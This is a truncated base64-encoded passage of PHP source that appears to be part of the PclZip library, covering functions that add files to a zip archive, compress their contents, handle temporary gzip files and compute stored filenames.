nMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICAkdl9oZWFkZXIgPSBhcnJheSgpOw0KDQogICR2X25iID0gc2l6ZW9mKCRwX3Jlc3VsdF9saXN0KTsNCg0KICBmb3IgKCRqPTA7ICgkajxzaXplb2YoJHBfZmlsZWRlc2NyX2xpc3QpKSAmJiAoJHZfcmVzdWx0PT0xKTsgJGorKykgew0KICAgICRwX2ZpbGVkZXNjcl9saXN0WyRqXVsnZmlsZW5hbWUnXQ0KICAgID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddLCBmYWxzZSk7DQogICAgDQoNCiAgICBpZiAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddID09ICIiKSB7DQogICAgICBjb250aW51ZTsNCiAgICB9DQoNCiAgICBpZiAoICAgKCRwX2ZpbGVkZXNjcl9saXN0WyRqXVsndHlwZSddICE9ICd2aXJ0dWFsX2ZpbGUnKQ0KICAgICAgICAmJiAoIWZpbGVfZXhpc3RzKCRwX2ZpbGVkZXNjcl9saXN0WyRqXVsnZmlsZW5hbWUnXSkpKSB7DQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfRklMRSwgIkZpbGUgJyIuJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddLiInIGRvZXMgbm90IGV4aXN0Iik7DQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICBpZiAoICAgKCRwX2ZpbGVkZXNjcl9saXN0WyRqXVsndHlwZSddID09ICdmaWxlJykNCiAgICAgICAgfHwgKCRwX2ZpbGVkZXNjcl9saXN0WyRqXVsndHlwZSddID09ICd2aXJ0dWFsX2ZpbGUnKQ0KICAgICAgICB8fCAoICAgKCRwX2ZpbGVkZXNjcl9saXN0WyRqXVsndHlwZSddID09ICdmb2xkZXInKQ0KICAgICAgICAgICAgJiYgKCAgICFpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkNCiAgICAgICAgICAgICAgICB8fCAhJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF0pKQ0KICAgICAgICApIHsNCg0KICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGRGaWxlKCRwX2ZpbGVkZXNjcl9saXN0WyRqXSwgJHZfaGVhZGVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwX29wdGlvbnMpOw0KICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgICRwX3Jlc3VsdF9saXN0WyR2X25iKytdID0gJHZfaGVhZGVyOw0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGRGaWxlKCRwX2ZpbGVkZXNjciwgJiRwX2hlYWRlciwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICANCiAgJHBfZmlsZW5hbWUgPSAkcF9maWxlZGVzY3JbJ2ZpbGVuYW1lJ107DQoNCiAgaWYgKCRwX2ZpbGVuYW1lID09ICIiKSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgZmlsZSBsaXN0IHBhcmFtZXRlciAoaW52YWxpZCBvciBlbXB0eSBsaXN0KSIpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KDQogIGNsZWFyc3RhdGNhY2hlKCk7DQogICRwX2hlYWRlclsndmVyc2lvbiddID0gMjA7DQogICRwX2hlYWRlclsndmVyc2lvbl9leHRyYWN0ZWQnXSA9IDEwOw0KICAkcF9oZWFkZXJbJ2ZsYWcnXSA9IDA7DQogICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSA9IDA7DQogICRwX2hlYWRlclsnY3JjJ10gPSAwOw0KICAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddID0gMDsNCiAgJHBfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSA9IHN0cmxlbigkcF9maWxlbmFtZSk7DQogICRwX2hlYWRlclsnZXh0cmFfbGVuJ10gPSAwOw0KICAkcF9oZWFkZXJbJ2Rpc2snXSA9IDA7DQogICRwX2hlYWRlclsnaW50ZXJuYWwnXSA9IDA7DQogICRwX2hlYWRlclsnb2Zmc2V0J10gPSAwOw0KICAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10gPSAkcF9maWxlbmFtZTsNCiAgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSA9ICRwX2ZpbGVkZXNjclsnc3RvcmVkX2ZpbGVuYW1lJ107DQogICRwX2hlYWRlclsnZXh0cmEnXSA9ICcnOw0KICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gJ29rJzsNCiAgJHBfaGVhZGVyWydpbmRleCddID0gLTE7DQoNCiAgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddPT0nZmlsZScpIHsNCiAgICAkcF9oZWFkZXJbJ2V4dGVybmFsJ10gPSAweDAwMDAwMDAwOw0KICAgICRwX2hlYWRlclsnc2l6ZSddID0gZmlsZXNpemUoJHBfZmlsZW5hbWUpOw0KICB9DQogIA0KICBlbHNlIGlmICgkcF9maWxlZGVzY3JbJ3R5cGUnXT09J2ZvbGRlcicpIHsNCiAgICAkcF9oZWFkZXJbJ2V4dGVybmFsJ10gPSAweDAwMDAwMDEwOw0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9IGZpbGVtdGltZSgkcF9maWxlbmFtZSk7DQogICAgJHBfaGVhZGVyWydzaXplJ10gPSBmaWxlc2l6ZSgkcF9maWxlbmFtZSk7DQogIH0NCiAgDQogIGVsc2UgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddID09ICd2aXJ0dWFsX2ZpbGUnKSB7DQogICAgJHBfaGVhZGVyWydleHRlcm5hbCddID0gMHgwMDAwMDAwMDsNCiAgICAkcF9oZWFkZXJbJ3NpemUnXSA9IHN0cmxlbigkcF9maWxlZGVzY3JbJ2NvbnRlbnQnXSk7DQogIH0NCiAgDQoNCiAgaWYgKGlzc2V0KCRwX2ZpbGVkZXNjclsnbXRpbWUnXSkpIHsNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSAkcF9maWxlZGVzY3JbJ210aW1lJ107DQogIH0NCiAgZWxzZSBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ10gPT0gJ3ZpcnR1YWxfZmlsZScpIHsNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSB0aW1lKCk7DQogIH0NCiAgZWxzZSB7DQogICAgJHBfaGVhZGVyWydtdGltZSddID0gZmlsZW10aW1lKCRwX2ZpbGVuYW1lKTsNCiAgfQ0KDQogIGlmIChpc3NldCgkcF9maWxlZGVzY3JbJ2NvbW1lbnQnXSkpIHsNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10gPSBzdHJsZW4oJHBfZmlsZWRlc2NyWydjb21tZW50J10pOw0KICAgICRwX2hlYWRlclsnY29tbWVudCddID0gJHBfZmlsZWRlc2NyWydjb21tZW50J107DQogIH0NCiAgZWxzZSB7DQogICAgJHBfaGVhZGVyWydjb21tZW50X2xlbiddID0gMDsNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnQnXSA9ICcnOw0KICB9DQoNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9BRERdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfaGVhZGVyLCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0FERF0oUENMWklQX0NCX1BSRV9BREQsICR2X2xvY2FsX2hlYWRlcik7DQogICAgaWYgKCR2X3Jlc3VsdCA9PSAwKSB7DQogICAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gInNraXBwZWQiOw0KICAgICAgJHZfcmVzdWx0ID0gMTsNCiAgICB9DQoNCiAgICBpZiAoJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSAhPSAkdl9sb2NhbF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSB7DQogICAgICAkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfbG9jYWxfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSk7DQogICAgfQ0KICB9DQoNCiAgaWYgKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPT0gIiIpIHsNCiAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gImZpbHRlcmVkIjsNCiAgfQ0KICANCiAgaWYgKHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSA+IDB4RkYpIHsNCiAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gJ2ZpbGVuYW1lX3Rvb19sb25nJzsNCiAgfQ0KDQogIGlmICgkcF9oZWFkZXJbJ3N0YXR1cyddID09ICdvaycpIHsNCg0KICAgIGlmICgkcF9maWxlZGVzY3JbJ3R5cGUnXSA9PSAnZmlsZScpIHsNCiAgICAgIGlmICggKCFpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRl0pKSANCiAgICAgICAgICAmJiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTl0pDQogICAgICAgICAgICAgIHx8IChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pDQogICAgICAgICAgICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdIDw9ICRwX2hlYWRlclsnc2l6ZSddKSkgKSApIHsNCiAgICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGRGaWxlVXNpbmdUZW1wRmlsZSgkcF9maWxlZGVzY3IsICRwX2hlYWRlciwgJHBfb3B0aW9ucyk7DQogICAgICAgIGlmICgkdl9yZXN1bHQgPCBQQ0xaSVBfRVJSX05PX0VSUk9SKSB7DQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgDQogICAgICBlbHNlIHsNCg0KICAgICAgaWYgKCgkdl9maWxlID0gQGZvcGVuKCRwX2ZpbGVuYW1lLCAicmIiKSkgPT0gMCkgew0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAiVW5hYmxlIHRvIG9wZW4gZmlsZSAnJHBfZmlsZW5hbWUnIGluIGJpbmFyeSByZWFkIG1vZGUiKTsNCiAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICB9DQoNCiAgICAgICR2X2NvbnRlbnQgPSBAZnJlYWQoJHZfZmlsZSwgJHBfaGVhZGVyWydzaXplJ10pOw0KDQogICAgICBAZmNsb3NlKCR2X2ZpbGUpOw0KDQogICAgICAkcF9oZWFkZXJbJ2NyYyddID0gQGNyYzMyKCR2X2NvbnRlbnQpOw0KICAgICAgDQogICAgICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OXSkgew0KICAgICAgICAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddID0gJHBfaGVhZGVyWydzaXplJ107DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSA9IDA7DQogICAgICB9DQogICAgICANCiAgICAgIGVsc2Ugew0KICAgICAgICAkdl9jb250ZW50ID0gQGd6ZGVmbGF0ZSgkdl9jb250ZW50KTsNCg0KICAgICAgICAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddID0gc3RybGVuKCR2X2NvbnRlbnQpOw0KICAgICAgICAkcF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gPSA4Ow0KICAgICAgfQ0KICAgICAgDQogICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2V3JpdGVGaWxlSGVhZGVyKCRwX2hlYWRlcikpICE9IDEpIHsNCiAgICAgICAgQGZjbG9zZSgkdl9maWxlKTsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgQGZ3cml0ZSgkdGhpcy0+emlwX2ZkLCAkdl9jb250ZW50LCAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCg0KICAgICAgfQ0KDQogICAgfQ0KDQogICAgZWxzZSBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ10gPT0gJ3ZpcnR1YWxfZmlsZScpIHsNCiAgICAgICAgDQogICAgICAkdl9jb250ZW50ID0gJHBfZmlsZWRlc2NyWydjb250ZW50J107DQoNCiAgICAgICRwX2hlYWRlclsnY3JjJ10gPSBAY3JjMzIoJHZfY29udGVudCk7DQogICAgICANCiAgICAgIGlmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT05dKSB7DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAkcF9oZWFkZXJbJ3NpemUnXTsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gMDsNCiAgICAgIH0NCiAgICAgIA0KICAgICAgZWxzZSB7DQogICAgICAgICR2X2NvbnRlbnQgPSBAZ3pkZWZsYXRlKCR2X2NvbnRlbnQpOw0KDQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSBzdHJsZW4oJHZfY29udGVudCk7DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSA9IDg7DQogICAgICB9DQogICAgICANCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUZpbGVIZWFkZXIoJHBfaGVhZGVyKSkgIT0gMSkgew0KICAgICAgICBAZmNsb3NlKCR2X2ZpbGUpOw0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KDQogICAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2NvbnRlbnQsICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10pOw0KICAgIH0NCg0KICAgIGVsc2UgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddID09ICdmb2xkZXInKSB7DQogICAgICBpZiAoQHN1YnN0cigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddLCAtMSkgIT0gJy8nKSB7DQogICAgICAgICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gLj0gJy8nOw0KICAgICAgfQ0KDQogICAgICAkcF9oZWFkZXJbJ3NpemUnXSA9IDA7DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUZpbGVIZWFkZXIoJHBfaGVhZGVyKSkgIT0gMSkNCiAgICAgIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9BRERdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfaGVhZGVyLCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9BRERdKFBDTFpJUF9DQl9QT1NUX0FERCwgJHZfbG9jYWxfaGVhZGVyKTsNCiAgICBpZiAoJHZfcmVzdWx0ID09IDApIHsNCiAgICAgICR2X3Jlc3VsdCA9IDE7DQogICAgfQ0KDQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2QWRkRmlsZVVzaW5nVGVtcEZpbGUoJHBfZmlsZWRlc2NyLCAmJHBfaGVhZGVyLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PVBDTFpJUF9FUlJfTk9fRVJST1I7DQogIA0KICAkcF9maWxlbmFtZSA9ICRwX2ZpbGVkZXNjclsnZmlsZW5hbWUnXTsNCg0KDQogIGlmICgoJHZfZmlsZSA9IEBmb3BlbigkcF9maWxlbmFtZSwgInJiIikpID09IDApIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAiVW5hYmxlIHRvIG9wZW4gZmlsZSAnJHBfZmlsZW5hbWUnIGluIGJpbmFyeSByZWFkIG1vZGUiKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2d6aXBfdGVtcF9uYW1lID0gUENMWklQX1RFTVBPUkFSWV9ESVIudW5pcWlkKCdwY2x6aXAtJykuJy5neic7DQogIGlmICgoJHZfZmlsZV9jb21wcmVzc2VkID0gQGd6b3Blbigkdl9nemlwX3RlbXBfbmFtZSwgIndiIikpID09IDApIHsNCiAgICBmY2xvc2UoJHZfZmlsZSk7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSB3cml0ZSBtb2RlJyk7DQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9zaXplID0gZmlsZXNpemUoJHBfZmlsZW5hbWUpOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKSB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdl9maWxlLCAkdl9yZWFkX3NpemUpOw0KICAgIEBnenB1dHMoJHZfZmlsZV9jb21wcmVzc2VkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICBAZmNsb3NlKCR2X2ZpbGUpOw0KICBAZ3pjbG9zZSgkdl9maWxlX2NvbXByZXNzZWQpOw0KDQogIGlmIChmaWxlc2l6ZSgkdl9nemlwX3RlbXBfbmFtZSkgPCAxOCkgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ2d6aXAgdGVtcG9yYXJ5IGZpbGUgXCcnLiR2X2d6aXBfdGVtcF9uYW1lLidcJyBoYXMgaW52YWxpZCBmaWxlc2l6ZSAtIHNob3VsZCBiZSBtaW5pbXVtIDE4IGJ5dGVzJyk7DQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICBpZiAoKCR2X2ZpbGVfY29tcHJlc3NlZCA9IEBmb3Blbigkdl9nemlwX3RlbXBfbmFtZSwgInJiIikpID09IDApIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gdGVtcG9yYXJ5IGZpbGUgXCcnLiR2X2d6aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgcmVhZCBtb2RlJyk7DQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdl9maWxlX2NvbXByZXNzZWQsIDEwKTsNCiAgJHZfZGF0YV9oZWFkZXIgPSB1bnBhY2soJ2ExaWQxL2ExaWQyL2ExY20vYTFmbGFnL1ZtdGltZS9hMXhmbC9hMW9zJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogICR2X2RhdGFfaGVhZGVyWydvcyddID0gYmluMmhleCgkdl9kYXRhX2hlYWRlclsnb3MnXSk7DQoNCiAgQGZzZWVrKCR2X2ZpbGVfY29tcHJlc3NlZCwgZmlsZXNpemUoJHZfZ3ppcF90ZW1wX25hbWUpLTgpOw0KICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdl9maWxlX2NvbXByZXNzZWQsIDgpOw0KICAkdl9kYXRhX2Zvb3RlciA9IHVucGFjaygnVmNyYy9WY29tcHJlc3NlZF9zaXplJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSA9IG9yZCgkdl9kYXRhX2hlYWRlclsnY20nXSk7DQogICRwX2hlYWRlclsnY3JjJ10gPSAkdl9kYXRhX2Zvb3RlclsnY3JjJ107DQogICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSBmaWxlc2l6ZSgkdl9nemlwX3RlbXBfbmFtZSktMTg7DQoNCiAgQGZjbG9zZSgkdl9maWxlX2NvbXByZXNzZWQpOw0KDQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUZpbGVIZWFkZXIoJHBfaGVhZGVyKSkgIT0gMSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBpZiAoKCR2X2ZpbGVfY29tcHJlc3NlZCA9IEBmb3Blbigkdl9nemlwX3RlbXBfbmFtZSwgInJiIikpID09IDApDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gdGVtcG9yYXJ5IGZpbGUgXCcnLiR2X2d6aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgcmVhZCBtb2RlJyk7DQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICBmc2Vlaygkdl9maWxlX2NvbXByZXNzZWQsIDEwKTsNCiAgJHZfc2l6ZSA9ICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ107DQogIHdoaWxlICgkdl9zaXplICE9IDApDQogIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gQGZyZWFkKCR2X2ZpbGVfY29tcHJlc3NlZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogIEBmY2xvc2UoJHZfZmlsZV9jb21wcmVzc2VkKTsNCg0KICBAdW5saW5rKCR2X2d6aXBfdGVtcF9uYW1lKTsNCiAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZDYWxjdWxhdGVTdG9yZWRGaWxlbmFtZSgmJHBfZmlsZWRlc2NyLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICAkcF9maWxlbmFtZSA9ICRwX2ZpbGVkZXNjclsnZmlsZW5hbWUnXTsNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF0pKSB7DQogICAgJHBfYWRkX2RpciA9ICRwX29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF07DQogIH0NCiAgZWxzZSB7DQogICAgJHBfYWRkX2RpciA9ICcnOw0KICB9DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdKSkgew0KICAgICRwX3JlbW92ZV9kaXIgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdOw0KICB9DQogIGVsc2Ugew0KICAgICRwX3JlbW92ZV9kaXIgPSAnJzsNCiAgfQ0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF0pKSB7DQogICAgJHBfcmVtb3ZlX2FsbF9kaXIgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9yZW1vdmVfYWxsX2RpciA9IDA7DQogIH0NCg0KDQogIGlmIChpc3NldCgkcF9maWxlZGVzY3JbJ25ld19mdWxsX25hbWUnXSkpIHsNCiAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkcF9maWxlZGVzY3JbJ25ld19mdWxsX25hbWUnXSk7DQogIH0NCiAgDQogIGVsc2Ugew0KDQogICAgaWYgKGlzc2V0KCRwX2ZpbGVkZXNjclsnbmV3X3Nob3J0X25hbWUnXSkpIHsNCiAgICAgICR2X3BhdGhfaW5mbyA9IHBhdGhpbmZvKCRwX2ZpbGVuYW1lKTsNCiAgICAgICR2X2RpciA9ICcnOw0KICAgICAgaWYgKCR2X3BhdGhfaW5mb1snZGlybmFtZSddICE9ICcnKSB7DQogICAgICAgICR2X2RpciA9ICR2X3BhdGhfaW5mb1snZGlybmFtZSddLicvJzsNCiAgICAgIH0NCiAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9ICR2X2Rpci4kcF9maWxlZGVzY3JbJ25ld19zaG9ydF9uYW1lJ107DQogICAgfQ0KICAgIGVsc2Ugew0KICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gJHBfZmlsZW5hbWU7DQogICAgfQ0KDQogICAgaWYgKCRwX3JlbW92ZV9hbGxfZGlyKSB7DQogICAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSBiYXNlbmFtZSgkcF9maWxlbmFtZSk7DQogICAgfQ0KICAgIGVsc2UgaWYgKCRwX3JlbW92ZV9kaXIgIT0gIiIpIHsNCiAgICAgIGlmIChzdWJzdHIoJHBfcmVtb3ZlX2RpciwgLTEpICE9ICcvJykNCiAgICAgICAgJHBfcmVtb3ZlX2RpciAuPSAiLyI7DQoNCiAgICAgIGlmICggICAoc3Vic3RyKCRwX2ZpbGVuYW1lLCAwLCAyKSA9PSAiLi8iKQ0KICAgICAgICAgIHx8IChzdWJzdHIoJHBfcmVtb3ZlX2RpciwgMCwgMikgPT0gIi4vIikpIHsNCiAgICAgICAgICANCiAgICAgICAgaWYgKCAgIChzdWJzdHIoJHBfZmlsZW5hbWUsIDAsIDIpID09ICIuLyIpDQogICAgICAgICAgICAmJiAoc3Vic3RyKCRwX3JlbW92ZV9kaXIsIDAsIDIpICE9ICIuLyIpKSB7DQogICAgICAgICAgJHBfcmVtb3ZlX2RpciA9ICIuLyIuJHBfcmVtb3ZlX2RpcjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoICAgKHN1YnN0cigkcF9maWxlbmFtZSwgMCwgMikgIT0gIi4vIikNCiAgICAgICAgICAgICYmIChzdWJzdHIoJHBfcmVtb3ZlX2RpciwgMCwgMikgPT0gIi4vIikpIHsNCiAgICAgICAgICAkcF9yZW1vdmVfZGlyID0gc3Vic3RyKCRwX3JlbW92ZV9kaXIsIDIpOw0KICAgICAgICB9DQogICAgICB9DQoNCiAgICAgICR2X2NvbXBhcmUgPSBQY2xaaXBVdGlsUGF0aEluY2x1c2lvbigkcF9yZW1vdmVfZGlyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X3N0b3JlZF9maWxlbmFtZSk7DQogICAgICBpZiAoJHZfY29tcGFyZSA+IDApIHsNCiAgICAgICAgaWYgKCR2X2NvbXBhcmUgPT0gMikgew0KICAgICAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9ICIiOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9IHN1YnN0cigkdl9zdG9yZWRfZmlsZW5hbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmxlbigkcF9yZW1vdmVfZGlyKSk7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogICAgDQogICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoJHZfc3RvcmVkX2ZpbGVuYW1lKTsNCiAgICANCiAgICBpZiAoJHBfYWRkX2RpciAhPSAiIikgew0KICAgICAgaWYgKHN1YnN0cigkcF9hZGRfZGlyLCAtMSkgPT0gIi8iKQ0KICAgICAgICAkdl9zdG